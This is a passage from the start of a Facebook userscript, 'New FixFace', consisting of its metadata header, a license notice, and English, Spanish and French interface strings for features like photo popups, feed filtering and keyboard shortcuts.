// ==UserScript==
// @name        New FixFace
// @namespace   Rui Fujiwara Script/
// @Enjoy your Facebook with this script!
// @include     http://facebook.com/*
// @include     http://*.facebook.com/*
// @include     https://facebook.com/*
// @include     https://*.facebook.com/*
// @exclude     http://*.facebook.com/plugins/*
// @exclude     https://*.facebook.com/plugins/*
// @author      Rui Fujiwara
// @timestamp   1317612196419
// @version     2
// ==/UserScript==

// Last edited 2012-10-24

/*

This copyright section and all credits in the script must be included in modifications or redistributions of this script.

HFP is Copyright (c) 2011, Rui Fujiwara
HFP is licensed under a Creative Commons Attribution-Share Alike 3.0 Unported License
License information is available here: http://ruifujiwara.co.cc/

Facebook is a registered trademark of Facebook, Inc.
HFP is not related to or endorsed by Facebook, Inc. in any way.

*/

/*

For next stable
* Pushing your Facebook More!

TODO:
* Make it Right!

*/


(function() {

if (self != window.top) { return; } // Don't run in frames

var version = '2';
var version_timestamp = 1317612196419; // javascript:window.alert(new Date().getTime());
var release_date = 20121024;

var loc;
var page = '';
var lastPage = '';
var homePageNotModified = true;
var id = 0;
var language = 'en';
var detectedLanguage = '';
var showPopupPicTimeout;
var hidePopupPicTimeout;
var storage;

var lang = {
	// English - By Rui Fujiwara
	en : {
		'_language' : 'English',
		'AddToCalendar' : 'Add to Calendar',
		'AddToGoogleCalendar' : 'Add to Google Calendar',
		'all' : 'all',
		'All' : 'All',
		'AllPhotosLoaded' : 'All photos loaded',
		'Automatic' : 'Automatic',
		'Birthday' : '%s\'s Birthday',
		'BookmarkAdd' : 'Add New Bookmark',
		'BookmarkExists' : 'There is already a bookmark for this page.\n\nGo to the page you want to bookmark and try again.',
		'BookmarkNamePrompt' : 'Enter a name for this bookmark:\n%s',
		'BookmarksConfirmRemoval' : 'Are you sure you want to remove the following bookmarks?',
		'BookmarksManage' : 'Manage Bookmarks',
		'BookmarksRemoveSelected' : 'Remove Selected Bookmarks',
		'Bookmarks' : 'Bookmarks',
		'BrowserUnsupported' : 'Your browser does not support this feature.',
		'CreatingFile' : 'Creating File',
		'Close' : 'Close',
		'ConfigureFacebookFixer' : 'Configure HFP',
		'ConfigureInstructions' : 'This script is develop from older script HFP and rebuild from Texnolize Script, visit my Blog at www.ruifujiwara.co.cc.',
		'ConfAge' : 'Show people\'s age on their profile (if they provide their full birthdate).',
		'ConfApplicationWhitelist' : 'Application Whitelist - Enter the IDs of applications to prevent them from being hidden. Separate IDs with a space.',
		'ConfAutoBigAlbumPictures' : 'Automatically show bigger album pictures when the page opens.',
		'ConfAutoLoadFullAlbum' : 'Automatically load thumbnnails for all images in an album on a single page.',
		'ConfAutoLoadTaggedPhotos' : 'Automatically load thumbnnails for all tagged photos on a single page (the photos tab on people\'s profiles).',
		'ConfAutoReadMore' : 'Automatically click on "see more" links.',
		'ConfBigAlbumPictures' : 'Add a link on album pages to show bigger versions of all pictures on that page.',
		'ConfBigAlbumPicturesBorder' : 'Add a border around bigger versions of pictures.',
		'ConfBookmarks' : 'Add a Bookmarks submenu to the top menu bar.',
		'ConfBottomBarHoverOpacity' : 'On mouse-over',
		'ConfBottomBarOpacity' : 'Bottom menu bar transparency',
		'ConfCalendarBirthDate' : 'Include the person\'s birthdate in the event details.',
		'ConfCalendarFullName' : 'Use the person\'s full name as the title for birthdays (instead of just first name).',
		'ConfChatDifferentiate' : 'Use bold and italics to differentiate between available and idle buddies.',
		'ConfChatHideIdle' : 'Hide idle buddies.',
		'ConfDelayPopupPics' : 'Add a short delay before showing popup pictures.',
		'ConfDelayPopupPicsTimeout' : 'Delay before showing popup pictures, in milliseconds (default=500):',
		'ConfDownloadVideo' : 'Add a link to download the videos from video pages. (You may need an <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfDisableTheater' : 'Disable the photo theater.',
		'ConfErrorPageReload' : 'Automaticaly reload application error pages after 5 seconds.',
		'ConfExport' : 'To export your settings, copy the text below and save it in a file.',
		'ConfExternalPopup' : 'Popup full-sized versions of external images. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Language for HFP',
		'ConfFacebookTimestamps' : 'Show Facebook timestamps (eg. "3 hours ago").',
		'ConfFBFTimestamps' : 'Add HFP timestamps after Facebook timestamps (eg. "11:45").',
		'ConfFBFTimestamps24' : 'Show HFP timestamps in 24-hour format.',
		'ConfFriendRequestCountInTitle' : 'Show the number of new friend requests in the page title.',
		'ConfFindFriendsLink' : 'Show the Find Friends link in the top menu bar.',
		'ConfGoogleApps' : 'Create Google Calendar links compatible with Google Apps.',
		'ConfGoogleAppsDomain' : 'Domain',
		'ConfGoogleCalendar' : 'Add links to add birthdays and events to <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Language for <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Hide application stories.',
		'ConfHideAskFriendStories' : 'Hide ask friend stories.',
		'ConfHideEgos' : 'Hide all "ego" sections (should hide most of Facebook\'s recommendations).',
		'ConfHideEventStories' : 'Hide event stories.',
		'ConfHideFacebookCountInTitle' : 'Hide Facebook\'s count of new inbox messages.',
		'ConfHideFriendStories' : 'Hide friend stories.',
		'ConfHideGroupStories' : 'Hide group stories.',
		'ConfHideHovercards' : 'Hide hovercards (the popup that appears when you mouse-over a name).',
		'ConfHideLikeStories' : 'Hide like stories.',
		'ConfHideLinkStories' : 'Hide link stories.',
		'ConfHideNoteStories' : 'Hide note stories.',
		'ConfHidePhotoStories' : 'Hide photo stories.',
		'ConfHidePlaceStories' : 'Hide place stories.',
		'ConfHideProfilePicStories' : 'Hide profile pic stories.',
		'ConfHideRead' : 'Hide items in the live feed that have been marked as read.',
		'ConfHideRelationshipStories' : 'Hide relationship stories.',
		'ConfHideStatusStories' : 'Hide status stories.',
		'ConfHideVideoStories' : 'Hide video stories.',
		'ConfHideWallStories' : 'Hide wall stories.',
		'ConfHomeChat' : 'Show the Chat section.',
		'ConfHomeChatNames' : 'Show names in the Chat section.',
		'ConfHomeEvents' : 'Show the Events section.',
		'ConfHomeFindFriends' : 'Show the Get Connected section.',
		'ConfHomeLeftAlign' : 'Left-align the contents of the home page.',
		'ConfHomeLeftColumn' : 'Show the left column.',
		'ConfHomeLeftColumnFixed' : 'Keep the left column visible, even after scrolling down.',
		'ConfHomeLink' : 'Show the Home link in the top menu bar.',
		'ConfHomeMostRecent' : 'Show the "Most Recent" feed by default.',
		'ConfHomeNavigation' : 'Show the Navigation section.',
		'ConfHomePokes' : 'Show the Pokes section.',
		'ConfHomeProfile' : 'Show the Profile section.',
		'ConfHomeRecommendations' : 'Show recommendations (People You May Know, Recommended Pages etc).',
		'ConfHomeRequests' : 'Show the Requests section.',
		'ConfHomeRightColumn' : 'Show the right column.',
		'ConfHomeStretch' : 'Stretch the home page to the full width of the browser window.',
		'ConfHomeStretchMiddleColumn' : 'Stretch the contents of the middle column of the home page.',
		'ConfiCalendar' : 'Add links to download an <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> file with all birthdays.',
		'ConfImport' : 'To import your settings later, overwrite the text below with the text you saved previously and click "Import".',
		'ConfInboxCountInTitle' : 'Show the number of new inbox messages in the page title.',
		'ConfLogoutLink' : 'Add a logout link to the top menu bar.',
		'ConfNotificationCountInTitle' : 'Show the number of new notifications in the page title.',
		'ConfNewTabSearch' : 'Make search results open in a new tab/window when pressing CTRL + Enter to search.',
		'ConfPageStretch' : 'Stretch all pages to the full width of the browser window.',
		'ConfPageTitle' : 'Remove "Facebook |" from the title of every page.',
		'ConfPhotoPopup' : 'Popup bigger versions of photos on mouse over.',
		'ConfPopupAutoClose' : 'Close popup pictures automatically.',
		'ConfPopupSmartAutoClose' : 'Prevent popup pictures from closing automatically if the mouse is over it.',
		'ConfPopupPosition' : 'Position for popup pictures',
		'ConfPopupWhileTagging' : 'Show popup pictures even when tagging.',
		'ConfProcessInterval' : 'Interval at which to process the page, in milliseconds (default=1000):',
		'ConfProfileLink' : 'Show the Profile link in the top menu bar.',
		'ConfProfilePicPopup' : 'Popup bigger versions of profile pictures on mouse over',
		'ConfProtocolLinks' : 'Turn messenger IDs on profiles into links that start a conversation with them (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'About HFP',
		'ConfSectionAdvanced' : 'Advanced',
		'ConfSectionEvents' : 'Birthdays/Events',
		'ConfSectionImportExport' : 'Import/Export',
		'ConfSectionFeeds' : 'Feeds',
		'ConfSectionHomePage' : 'Home Page',
		'ConfSectionLiveFeed' : 'Live Feed',
		'ConfSectionMenu' : 'Menus/Chat',
		'ConfSectionOther' : 'Other Options',
		'ConfSectionPageTitle' : 'Page Title',
		'ConfSectionPictures' : 'Pictures',
		'ConfSectionShortcuts' : 'Keyboard Shortcuts',
		'ConfSecureLinks' : 'Force Facebook links to point to HTTPS pages.',
		'ConfShortcutList' : '<b>Keyboard Shortucts</b> (case sensitive):<br /><br /><i>From any page:</i><br />&nbsp;<b>A</b> - Albums/photos<br />&nbsp;<b>B</b> - Toggle buddy list (online friends)<br />&nbsp;<b>C</b> - HFP configuration<br />&nbsp;<b>D</b> - Birthdays<br />&nbsp;<b>E</b> - Events<br />&nbsp;<b>F</b> - Friends<br />&nbsp;<b>H</b> - Home page<br />&nbsp;<b>I</b> - Inbox<br />&nbsp;<b>K</b> - Add Bookmark<br />&nbsp;<b>L</b> - Select the logout link (press Enter afterwards to log out)<br />&nbsp;<b>N</b> - Notifications<br />&nbsp;<b>P</b> - Your profile<br />&nbsp;<b>R</b> - Requests<br />&nbsp;<b>S</b> - Jump to the search field<br />&nbsp;<b>T</b> - Translate selected text<br />&nbsp;<b>?</b> - Show HFP debug info<br />&nbsp;<b>&lt;escape&gt;</b> - Close pop-ups created by HFP<br /><br /><i>From the home page (filters)</i>:<br />&nbsp;<b>a</b> - Pages<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Groups<br />&nbsp;<b>l</b> - Links<br />&nbsp;<b>n</b> - News feed<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>s</b> or <b>u</b> - Status updates<br />&nbsp;<b>t</b> - Notes<br />&nbsp;<b>v</b> - Videos<br /><br /><i>From profiles</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>w</b> - Wall<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>From pages with pagination (previous, next, etc)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - Next<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - First (when available)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Last (when available)<br /><br /><i>While viewing albums/photos:</i><br />&nbsp;<b>a</b> - Load all thumbnails (when available)<br />&nbsp;<b>b</b> - Show big pictures<br />&nbsp;<b>c</b> - View comments<br />&nbsp;<b>k</b> - Back to album<br />&nbsp;<b>m</b> - Photos of (person) and me<br /><br /><i>While viewing recent albums and uploaded/tagged photos:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Recent Albums<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Mobile uploads<br />&nbsp;<b>o</b> - Photos of me<br />&nbsp;<b>p</b> - My Photos<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Tagged friends',
		'ConfShortcuts' : 'Enable keyboard shortcuts.',
		'ConfSign' : 'Show people\'s sign on their profile (if they provide their birthdate).',
		'ConfTopBarFixed' : 'Keep the top menu bar on the screen always, even after scrolling down.',
		'ConfTopBarHoverOpacity' : 'On mouse-over',
		'ConfTopBarOpacity' : 'Top menu bar transparency',
		'DownloadVideo' : 'Download Video',
		'ExportICalendarFile' : 'Export iCalendar file',
		'ExportICalendarFileWarning' : '(This will take a while if you have a lot of friends)',
		'FacebookFixerConflict' : 'Facebook Fixer is now known as HFP.<br /><br />Because of the name change you need to manually uninstall Facebook Fixer from your browser, or the two scripts will conflict with each other.<br /><br />If you are aren\'t sure how to uninstall a userscript, <a %s>click here for instructions</a>.',
		'fullAlbumLoaded' : 'full album loaded',
		'Import' : 'Import',
		'ImportConfirm' : 'Are you sure you want to import these settings?\nYour current settings will be lost.',
		'ImportFailure' : 'An error occurred while trying to import your settings.',
		'ImportSuccess' : 'Import complete. Would you like to refresh the page?',
		'Left' : 'Left',
		'LoadingAllPhotos' : 'Loading all photos...',
		'loadingFullAlbum' : 'loading full album...',
		'LoadingPic' : 'Loading Pic...',
		'LoadPhotosWarning' : 'Loading all photos may take a long time',
		'Months' : new Array('January','February','March','April','May','June','July','August','September','October','November','December'),
		'ProtocolSkype' : 'Call %s using Skype',
		'ProtocolMSN' : 'Chat with %s using Windows Live',
		'ProtocolYahoo' : 'Chat with %s using Yahoo Messenger',
		'ProtocolGoogle' : 'Chat with %s using Google Talk',
		'ReloadErrorPage' : 'Click to Try Again, or wait 5 seconds',
		'Refresh' : 'Refresh',
		'Remove' : 'Remove',
		'Right' : 'Right',
		'ShowBigPictures' : 'Show Big Pictures',
		'Signs' : new Array('Capricorn','Aquarius','Pisces','Aries','Taurus','Gemini','Cancer','Leo','Virgo','Libra','Scorpio','Sagittarius'),
		'today' : 'today', // this is the lower case version of the text Facebook uses on the home page to mark today's birthdays
		'Translators' : 'Translators',
		'UpdateAvailable1' : 'An update is available for HFP',
		'UpdateAvailable2' : 'Would you like to update now?',
		'UpdateHomepage' : 'Go to homepage',
		'UpdateInstall' : 'Install now',
		'UpdateTomorrow' : 'Remind me tomorrow',
		'yearsOld' : '%s years old'
	},

	// Spanish - Contributed by Glen Farmer and Neo (20100626)
	es : {
		'_language' : 'Spanish',
		'AddToCalendar' : 'Añadir a Calendario',
		'AddToGoogleCalendar' : 'Añadir a Calendario Google',
		'all' : 'todo',
		'All' : 'Todo',
		'AllPhotosLoaded' : 'Todas las fotos han sido cargadas',
		'Automatic' : 'Automático',
		'Birthday' : 'El cumpleaños de %s',
		'BookmarkAdd' : 'Añadir Un Marcador Nuevo',
		'BookmarkConfirmRemoval' : '¿Está seguro que desea eliminar marcador "%s"?',
		'BookmarkDoesNotExist' : 'Esta página no ha sido marcada,\n\nVaya a la página que desea eliminar e intente de nuevo.',
		'BookmarkExists' : 'Ya existe un marcador para esta página.\n\nVaya a la página que desea marcar e intente de nuevo.',
		'BookmarkNamePrompt' : 'Introduzca un nombre para este el siguiente marcador:\n%s',
		'BookmarkRemove' : 'Eliminar el marcador',
		'Bookmarks' : 'Marcadores',
		'BrowserUnsupported' : 'Su navegador no soporta esta función.',
		'Close' : 'Cerrar',
		'ConfigureFacebookFixer' : 'Configuración de HFP',
		'ConfigureInstructions' : 'Todos los cambios son guardados inmediatamente, pero algunos cambios tendrán efecto en ventanas que ya estén abiertas.',
		'ConfAge' : 'Mostrar edad de las personas en sus perfiles (Solo si muestran su fecha de nacimiento).',
		'ConfAutoBigAlbumPictures' : 'Mostrar automáticamente las fotos de los álbumes grandes al abrir alguno de ellos.',
		'ConfAutoLoadFullAlbum' : 'Cargar automaticamente las MINIATURAS de todas las imagenes de un álbum en una sola página.',
		'ConfAutoLoadTaggedPhotos' : 'Cargar automaticamente las MINIATURAS de todas las fotos etiquetadas de un usuario en una sola página (La pestaña Fotos de "Usuario").',
		'ConfBigAlbumPictures' : 'Añadir un enlace en la página de los álbumes para mostrar las versiones grandes de todas las fotos.',
		'ConfBookmarks' : 'Añadir el menu de Marcadores a la barra superior de menús',
		'ConfBottomBarHoverOpacity' : 'Al pasar el ratón por encima',
		'ConfBottomBarOpacity' : 'Transparencia de la barra de menu de abajo',
		'ConfCalendarBirthDate' : 'Incluir la fecha de cumpleaños de las personas en los detalles de los eventos.',
		'ConfCalendarFullName' : 'Usar el nombre completo de las personas para el titulo de los cumpleaños (en vez de solo el primer nombre).',
		'ConfChatDifferentiate' : 'Usar negrita y cursiva para diferenciar entre amigos disponibles y ausentes.',
		'ConfChatHideIdle' : 'Ocultar los amigos ausentes.',
		'ConfDelayPopupPics' : 'Esperar 0.5 segundos antes de enseñar ventana emergente de las fotos.',
		'ConfDelayPopupPicsTimeout' : 'Retardo en mili-segundos antes de enseñar las fotos (Por defecto 500 mili-segundos)',
		'ConfDownloadVideo' : 'Añadir un enlace para descargar los videos de las páginas de videos. (Puede que necesites un <a href="http://es.wikipedia.org/wiki/Flash_Video#Reproductores_FLV" target="_blank">FLV player</a>)',
		'ConfErrorPageReload' : 'Recargar automáticamente aplicaciones con errores despues de 5 segundos',
		'ConfExport' : 'Para exportar la configuración, copie el siguiente texto y guárdelo en un archivo.',
		'ConfExternalPopup' : 'Crear una ventana emergente con las fotos externas en tamaño real. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Lenguaje del HFP',
		'ConfFacebookTimestamps' : 'Mostrar cuanto hace que fue creado (Ejemplo: "Hace 3 horas").',
		'ConfFBFTimestamps24' : 'Mostrar las marcas de tiempo de HFP en formato 24 horas.',
		'ConfFBFTimestamps' : 'Añadir las marcas de tiempo de HFP después de las marcas de tiempo de Facebook (Por ejemplo "11:45").',
		'ConfFriendRequestCountInTitle' : 'Mostrar el número de personas esperando para ser amigos en el título de la página.',
		'ConfGoogleApps' : 'Crear enlaces de Calendarios de Google compatibles con las Aplicaciones de Google.',
		'ConfGoogleAppsDomain' : 'Dominio',
		'ConfGoogleCalendar' : 'Mostrar enlaces para añadir cumpleaños y eventos a <a href="http://es.wikipedia.org/wiki/Google_Calendar" target="_blank">Calendarios de Google</a>.',
		'ConfGoogleLanguage' : 'Idiomas para <a href="http://es.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Ocultar los mensajes de las aplicaciones.',
		'ConfHideEventStories' : 'Ocultar los mensajes de eventos.',
		'ConfHideFanStories' : 'Ocultar los mensajes de los fan.',
		'ConfHideFriendStories' : 'Ocultar los mensajes de los amigos.',
		'ConfHideGroupStories' : 'Ocultar los mensajes de los grupos.',
		'ConfHideLinkStories' : 'Ocultar los mensajes de los vínculos.',
		'ConfHidePhotoStories' : 'Ocultar los mensajes de las fotos.',
		'ConfHideProfilePicStories' : 'Ocultar los mensajes de las fotos del perfil.',
		'ConfHideRead' : 'Ocultar los mensajes de Live Feed que han sido marcados como leídos.',
		'ConfHideRelationshipStories' : 'Ocultar mensajes de las relaciones.',
		'ConfHideStatusStories' : 'Ocultar mensajes de estado.',
		'ConfHideVideoStories' : 'Ocultar mensajes de los vídeos.',
		'ConfHideWallStories' : 'Ocultar mensajes de los muros.',
		'ConfHomeChat' : 'Mostrar la sección de chat.',
		'ConfHomeEvents' : 'Mostrar la sección de eventos.',
		'ConfHomeFindFriends' : 'Mostrar la sección de "Conecta con tus amigos".',
		'ConfHomeLeftAlign' : 'Alinear a la izquierda el contenido de la pagina de inicio.',
		'ConfHomeLeftAlign' : 'Alinear a la izquierda el contenido de la página principal.',
		'ConfHomeLeftColumn' : 'Mostrar la columna izquierda.',
		'ConfHomeLeftColumnFixed' : 'Mantener la columna izquierda siempre visible.',
		'ConfHomeLink' : 'Mostrar el vínculo de Home en el menú superior.',
		'ConfHomeNavigation' : 'Mostrar la sección de navegación.',
		'ConfHomePeopleYouMayKnow' : 'Mostrar la sección sugerencia de amigos.',
		'ConfHomePokes' : 'Mostrar la sección de Toques.',
		'ConfHomeProfile' : 'Mostrar la sección de perfil.',
		'ConfHomeRequests' : 'Mostrar la sección de Peticiones.',
		'ConfHomeRightColumn' : 'Mostrar la columna derecha.',
		'ConfHomeStretch' : 'Ajustar ancho de la página principal al tamaño del navegador.',
		'ConfiCalendar' : 'Añadir enlaces para descargar un archivo <a href="http://es.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> con todos los cumpleaños.',
		'ConfImport' : 'Para importar la configuración, pegue aquí el texto anteriormente guardado y haga clic en "Importar".',
		'ConfInboxCountInTitle' : 'Mostrar el número de mensajes nuevos de la bandeja de entrada en el título de la página',
		'ConfLogoutLink' : 'Añadir vínculo para cerrar la sesión en el menú superior.',
		'ConfNewTabSearch' : 'Hacer que los resultados de una busqueda se abran en una nueva pestaña al pulsar CTRL + Enter.',
		'ConfNotificationCountInTitle' : 'Mostrar el número de nuevas notificaciones en el título de la página.',
		'ConfPageTitle' : 'Eliminar "Facebook |" del titulo de cada página.',
		'ConfPhotoPopup' : 'Ampliar foto en ventana emergente al pasar el ratón sobre ella.',
		'ConfPopupAutoClose' : 'Cerrar ventana emergente automáticamente.',
		'ConfPopupPosition' : 'Posicion de la ventana emergente',
		'ConfPopupSmartAutoClose' : 'Prevenir que las ventanas emergentes se cierren automáticamente cuando el ratón pase por encima de ellas.',
		'ConfProcessInterval' : 'Intervalo en mili-segundos en el cual se procesa la página (Por defecto 1000):',
		'ConfProfileLink' : 'Mostrar el vínculo del perfil en el menú superior.',
		'ConfProfilePicPopup' : 'Ampliar foto del perfil en una ventana emergente al pasar el ratón sobre ella.',
		'ConfProtocolLinks' : 'Convertir los IDs de los programas de chats de los perfiles en enlaces para comemzar un chat (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'Acerca de HFP',
		'ConfSectionAdvanced' : 'Avanzado',
		'ConfSectionEvents' : 'Cumpleaños/Eventos',
		'ConfSectionHomePage' : 'Inicio',
		'ConfSectionImportExport' : 'Importar/Exportar',
		'ConfSectionMenu' : 'Menús/Chat',
		'ConfSectionOther' : 'Otras Opciones',
		'ConfSectionPageTitle' : 'Título de la Página',
		'ConfSectionPictures' : 'Fotos',
		'ConfSectionShortcuts' : 'Atajos de Teclado',
		'ConfSecureLinks' : 'Hacer que los links apunten a paginas HTTPS.',
		'ConfShortcutList' : '<b>Atajos de Teclado</b> (sensible a la diferencia entre minúsculas y mayúsculas):<br /><br /><i>Desde cualquier página:</i><br />&nbsp;<b>A</b> - Álbumes/Fotos<br />&nbsp;<b>B</b> - Activar/Desactivar lista de amigos (Amigos conectados)<br />&nbsp;<b>C</b> - Configuración de HFP<br />&nbsp;<b>D</b> - Cumpleaños<br />&nbsp;<b>E</b> - Eventos<br />&nbsp;<b>F</b> - Amigos<br />&nbsp;<b>H</b> - Página de Inicio<br />&nbsp;<b>I</b> - Bandeja de Entrada<br />&nbsp;<b>K</b> - Añadir Marcador<br />&nbsp;<b>L</b> - Seleccionar vínculo para terminar la sesión (presione Enter después para terminar la sesión)<br />&nbsp;<b>N</b> - Notificaciones<br />&nbsp;<b>P</b> - Perfil<br />&nbsp;<b>R</b> - Peticiones<br />&nbsp;<b>S</b> - Saltar a el campo de búsqueda<br />&nbsp;<b>T</b> - Traducir el texto seleccionado<br />&nbsp;<b>?</b> - Mostrar la información de depuración de HFP<br />&nbsp;<b><escape></b> - Cerrar la ventana emergente creada por HFP<br /><br /><i>Desde la página de inicio (filtros)</i>:<br />&nbsp;<b>a</b> - Páginas<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Grupos<br />&nbsp;<b>l</b> - Vínculos<br />&nbsp;<b>n</b> - Noticias<br />&nbsp;<b>p</b> - fotos<br />&nbsp;<b>s</b> or <b>u</b> - Estatus de las Actualizaciones<br />&nbsp;<b>t</b> - Notas<br />&nbsp;<b>v</b> - Vídeos<br /><br /><i>Desde los perfiles</i>:<br />&nbsp;<b>i</b> - Información<br />&nbsp;<b>p</b> - Fotos<br />&nbsp;<b>w</b> - Muro<br />&nbsp;<b>x</b> - Cajas<br /><br /><i>Desde las páginas con paginación (previo, siguiente, etc)</i><br />&nbsp;<b><left arrow></b> - Previo<br />&nbsp;<b><right arrow></b> - Siguiente<br />&nbsp;<b><shift> + <left arrow></b> - Primera (cuando este disponible)<br />&nbsp;<b><shift> + <right arrow></b> - Ultimo (cuando este disponible)<br /><br /><i>Al ver albumes/fotos:</i><br />&nbsp;<b>a</b> - Ver todas la miniaturas (cuando este disponible)<br />&nbsp;<b>b</b> - Ver fotos grandes<br />&nbsp;<b>c</b> - Ver comentarios<br />&nbsp;<b>k</b> - De vuelta al álbum<br />&nbsp;<b>m</b> - Fotos de (personas) y yo<br /><br /><i>Al ver albumes recientes y fotos subidas/marcadas:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Albumes Recientes<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Fotos de Móviles<br />&nbsp;<b>o</b> - Fotos de mi<br />&nbsp;<b>p</b> - Mis Fotos<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Amigos Marcados', 'ConfTopBarHoverOpacity' : 'Al pasar el ratón por encima', 'FacebookFixerConflict' : 'Facebook Fixer ahora se llama HFP.<br /><br />Por el cambio de nombre es necesario desinstalar Facebook Fixer manualmente de su navegador o los dos programas entraran en conflicto.<br /><br />Si no sabe como desinstalar un userscript, <a %s>haga clic aquí para ver instrucciones</a>.',
		'ConfShortcuts' : 'Abilitar los atajos de teclado.',
		'ConfSign' : 'Mostrar los signos zodiacales de las personas en sus perfiles (Si indican fecha de nacimiento).',
		'ConfTopBarFixed' : 'Mantener la barra superior de menu en la pantalla siempre.',
		'ConfTopBarHoverOpacity' : 'Al pasar el ratón por encima',
		'ConfTopBarOpacity' : 'Transparencia de la barra de menu superior',
		'CreatingFile' : 'Creando Archivo',
		'DownloadVideo' : 'Descargar el Video',
		'ExportICalendarFile' : 'Exportar el archivo de iCalendar',
		'ExportICalendarFileWarning' : '(Esto puede tardar bastante dependiendo de la cantidad de amigos)',
		'FacebookFixerConflict' : 'Facebook Fixer ahora se llama HFP.<br /><br />Por el cambio de nombre es necesario desinstalar Facebook Fixer manualmente de su navegador o los dos programas entraran en conflicto.<br /><br />Si no sabe como desinstalar un userscript, <a %s>haga clic aquí para ver instrucciones</a>.',
		'fullAlbumLoaded' : 'álbum completamente cargado',
		'Import' : 'Importar',
		'ImportConfirm' : '¿Está seguro que desea importar esta configuración?\nPerderá la configuración actual al hacer esto.',
		'ImportFailure' : 'Ha ocurrido un error al tratar de importar la configuración.',
		'ImportSuccess' : 'Se ha importado la configuración. ¿Desea refrescar la página?',
		'Left' : 'Izquierda',
		'LoadingAllPhotos' : 'Cargando todas las fotos...',
		'loadingFullAlbum' : 'Cargando álbumes completos...',
		'LoadingPic' : 'Cargando Foto...',
		'LoadPhotosWarning' : 'Cargar todas las fotos puede tomar mucho tiempo',
		'Months' : new Array('enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'),
		'ProtocolGoogle' : 'Chatear con %s usando Google Talk',
		'ProtocolMSN' : 'Chatear con %s usando Windows Live',
		'ProtocolSkype' : 'Llamar a  %s usando Skype',
		'ProtocolYahoo' : 'Chatear con %s usando Yahoo Messenger',
		'Refresh' : 'Recargar',
		'ReloadErrorPage' : 'Hacer clic para intentar de nuevo o esperar 5 segundos',
		'Remove' : 'Eliminar',
		'Right' : 'Derecha',
		'ShowBigPictures' : 'Mostrar Imágenes Grandes',
		'Signs' : new Array('Capricornio','Acuario','Piscis','Aries','Tauro','Géminis ','Cancer','Leo','Virgo','Libra','Escorpio','Sagitario'),
		'today' : 'hoy',
		'Translators' : 'Tranductores',
		'UpdateAvailable1' : 'Hay una actualización disponible para HFP',
		'UpdateAvailable2' : '¿Desea actualizar ahora?',
		'UpdateHomepage' : 'Ir a la página de inicio',
		'UpdateInstall' : 'Instalar ahora',
		'UpdateTomorrow' : 'Recordar mañana',
		'yearsOld' : '%s años'
	},

	// French - Contributed by Serge Thiry (20110101)
	fr : {
		'_language' : 'French',
		'AddToCalendar' : 'Ajouter à l\'Agenda',
		'AddToGoogleCalendar' : 'Ajouter au Google Agenda',
		'all' : 'tout',
		'All' : 'Tout',
		'AllPhotosLoaded' : 'Toutes les photos sont chargées',
		'Automatic' : 'Automatique',
		'Birthday' : 'Anniversaire de %s',
		'BookmarkAdd' : 'Ajout d\'un Marque-Page',
		'BookmarkExists' : 'Cette page a déjà été marquée.\n\nAllez à la page que vous souhaitez marquer et ré-essayez.',
		'BookmarkNamePrompt' : 'Entrez un nom pour ce marque-page:\n%s',
		'BookmarksConfirmRemoval' : '&Ecirc;tes-vous s&ucirc;r de vouloir supprimer les marque-pages suivants?',
		'BookmarksManage' : 'G&eacute;rer les marque-pages',
		'BookmarksRemoveSelected' : 'Supprimer les marque-pages s&eacute;lectionn&eacute;s',
		'Bookmarks' : 'Marque-pages',
		'BrowserUnsupported' : 'Votre navigateur Internet ne supporte pas cette fonction.',
		'CreatingFile' : 'Création du fichier',
		'Close' : 'Fermer',
		'ConfigureFacebookFixer' : 'Configurer HFP',
		'ConfigureInstructions' : 'Tout changement est immédiatement sauvegardé, mais il est possible que certains changements ne s\'actualisent pas dans des onglets déjà ouverts.',
		'ConfAge' : 'Affichage de l\'âge des personnes sur leur profil (si la date de naissance insérée est complète).',
		'ConfApplicationWhitelist' : 'Liste blanche des applications - Ins&eacute;rez l\'ID des applications que vous d&eacute;sirez prot&eacute;ger du masquage automatique. S&eacute;parez les IDs d\'un espace.',
		'ConfAutoBigAlbumPictures' : 'Affichage automatique des photos agrandies à l\'ouverture d\'un album.',
		'ConfAutoLoadFullAlbum' : 'Chargement automatique des aperçus de toutes les images contenues dans l\'album, sur une seule page.',
		'ConfAutoLoadTaggedPhotos' : 'Chargement automatique des aperçus de toutes les photos identifiées, sur une seule page (l\'onglet Photos des profils).',
		'ConfAutoReadMore' : 'Clic automatique sur les liens "Afficher d\'avantage".',
		'ConfBigAlbumPictures' : 'Ajout d\'un lien dans les albums permettant d\'afficher une version agrandie de toutes les images de la page.',
		'ConfBigAlbumPicturesBorder' : 'Ajoute une bordure autour des version agrandies des images.',
		'ConfBookmarks' : 'Ajoute un sous-menu Marque-Pages à la barre de menu supérieure.',
